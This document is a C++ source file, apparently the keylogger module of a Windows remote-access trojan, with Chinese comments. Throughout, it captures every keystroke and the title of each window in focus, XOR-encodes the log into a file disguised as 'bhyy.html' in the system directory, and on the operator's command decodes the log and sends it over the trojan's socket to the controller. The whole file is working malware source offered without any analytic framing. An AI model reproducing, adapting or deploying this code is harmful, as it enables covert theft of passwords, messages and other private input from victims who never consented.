#include "pch.h"
#include "KeyboardManager.h"
#include"key.h"
#include<tchar.h>

HWND PreviousFocus = NULL;
CHAR WindowCaption[1024] = { 0 };
HWND hFocus = NULL;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
void SaveToFile(TCHAR* lpBuffer)
{
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, _T("\\bhyy.html"));
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	if (dwSize < 1024 * 1024 * 50)
		SetFilePointer(hFile, 0, 0, FILE_END);
	// 加密
	int	nLength = lstrlen(lpBuffer);
	TCHAR* lpEncodeBuffer = new TCHAR[nLength];
	for (int i = 0; i < nLength; i++)
		lpEncodeBuffer[i] = lpBuffer[i] ^ _T('`');
	WriteFile(hFile, lpEncodeBuffer, lstrlen(lpBuffer) * sizeof(TCHAR), &dwBytesWrite, NULL);
	CloseHandle(hFile);
	delete[] lpEncodeBuffer;
	return;
}

BOOL IsWindowsFocusChange()
{
	memset(WindowCaption, 0, sizeof(WindowCaption));
	hFocus = GetForegroundWindow();
	GetWindowText(hFocus, WindowCaption, sizeof(WindowCaption));
	BOOL ReturnFlag = FALSE;
	CHAR temp[1024] = { 0 };
	if (hFocus == PreviousFocus)
	{
	}
	else
	{
		if (lstrlen(WindowCaption) > 0)
		{
			SYSTEMTIME   s;
			GetLocalTime(&s);
			wsprintf(temp, "\r\n-------------------------------------------\r\n[标题:]%s\r\n[时间:]%d-%d-%d  %d:%d:%d\r\n", WindowCaption, s.wYear, s.wMonth, s.wDay, s.wHour, s.wMinute, s.wSecond);
			SaveToFile(temp);
			memset(temp, 0, sizeof(temp));
			memset(WindowCaption, 0, sizeof(WindowCaption));
			ReturnFlag = TRUE;
		}
		PreviousFocus = hFocus;
	}
	return ReturnFlag;
}

DWORD WINAPI KeyLogger(LPVOID lparam)
{
	int bKstate[256] = { 0 };
	int i, x;
	CHAR KeyBuffer[600] = { 0 };
	int state;
	int shift;
	memset(KeyBuffer, 0, sizeof(KeyBuffer));
	while (TRUE)
	{
		Sleep(10);
		if (lstrlen(KeyBuffer) != 0)
		{
			if (IsWindowsFocusChange())
			{
				//	lstrcat(KeyBuffer,"\r\n");
				//	lstrcat(KeyBuffer,"\n"); //注释掉解决复制粘贴乱码
				SaveToFile("[内容:]");
				SaveToFile(KeyBuffer);
				memset(KeyBuffer, 0, sizeof(KeyBuffer));
			}
			else
			{
				//	lstrcat(KeyBuffer,"\n");//注释掉解决复制粘贴乱码
				SaveToFile(KeyBuffer);
				memset(KeyBuffer, 0, sizeof(KeyBuffer));

			}
		}

		//94
		for (i = 0; i < 101; i++)
		{
			shift = GetKeyState(VK_SHIFT);
			x = SpecialKeys[i];
			if (GetAsyncKeyState(x) & 0x8000)
			{
				//93
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 93))) //Caps Lock And Shift Is Not Pressed
				{
					bKstate[x] = 1;
				}
				else                                                                     //93
					if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 93))) //Caps Lock And Shift Is Pressed
					{
						bKstate[x] = 2;
					}
					else
						if (shift < 0)
						{
							bKstate[x] = 3;
						}
						else
							bKstate[x] = 4;
			}
			else
			{
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) //退键
					{
						// 						KeyBuffer[lstrlen(KeyBuffer) - 1] = 0;
						// 						continue;
						lstrcat(KeyBuffer, "<BackSpace>");
						SaveToFile(KeyBuffer);
						memset(KeyBuffer, 0, sizeof(KeyBuffer));
						continue;

					}
					else
						if (lstrlen(KeyBuffer) > 550)
						{
							SaveToFile(KeyBuffer);
							memset(KeyBuffer, 0, sizeof(KeyBuffer));
							continue;
						}
						else
							if (x == 13) //回车
							{
								/*if (lstrlen(KeyBuffer) == 0)
								{
									continue;
								}*///不去掉的话 Enter无法记录
								lstrcat(KeyBuffer, "<Enter>\r\n");//自动换行
								SaveToFile(KeyBuffer);
								memset(KeyBuffer, 0, sizeof(KeyBuffer));
								continue;
							}
							else
							{
								if ((state % 2) == 1)
								{
									lstrcat(KeyBuffer, (CHAR*)UpperCase[i]);

								}
								else
									if ((state % 2) == 0)
									{
										lstrcat(KeyBuffer, (CHAR*)LowerCase[i]);


									}
							}
				}
			}
		}
	}
	return 0;
}

CKeyboardManager::CKeyboardManager(CClientSocket* pClient) : CManager(pClient)
{
	sendStartKeyBoard();
	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0, NULL, true);
	WaitForDialogOpen();
}

CKeyboardManager::~CKeyboardManager()
{
	if (hThread)
	{
		TerminateThread(hThread, 0);
		Sleep(1000);
		//删除离线记录文件
		TCHAR	strRecordFile[MAX_PATH];
		GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
		lstrcat(strRecordFile, _T("\\bhyy.html"));
		DeleteFile(strRecordFile);
	}
	
}

void CKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_NEXT)
		NotifyDialogIsOpen();

	if (lpBuffer[0] == COMMAND_KEYBOARD_GET)
	{
		WaitForDialogOpen();
		sendOfflineRecord();
		Sleep(300);
	}

	if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR)
	{
		TCHAR	strRecordFile[MAX_PATH];
		GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
		lstrcat(strRecordFile, _T("\\bhyy.html"));
		DeleteFile(strRecordFile);
	}
}

int CKeyboardManager::sendStartKeyBoard()
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_KEYBOARD_START;
	bToken[1] = (BYTE)true;

	return Send((LPBYTE)&bToken[0], sizeof(bToken));
}

int CKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	int nRet = -1;
	DWORD	dwBytesLength = 1 + nSize;
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
	memcpy(lpBuffer + 1, lpData, nSize);

	nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
	LocalFree(lpBuffer);
	return nRet;
}

int CKeyboardManager::sendOfflineRecord()
{
	int		nRet = 0;
	DWORD	dwSize = 0;
	DWORD	dwBytesRead = 0;
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, _T("\\bhyy.html"));
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		dwSize = GetFileSize(hFile, NULL);
		TCHAR* lpBuffer = new TCHAR[dwSize];
		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
		// 解密
		for (int i = 0; i < (dwSize / sizeof(TCHAR)); i++)
			lpBuffer[i] ^= _T('`');
		nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
		delete[] lpBuffer;
	}
	CloseHandle(hFile);
	return nRet;
}

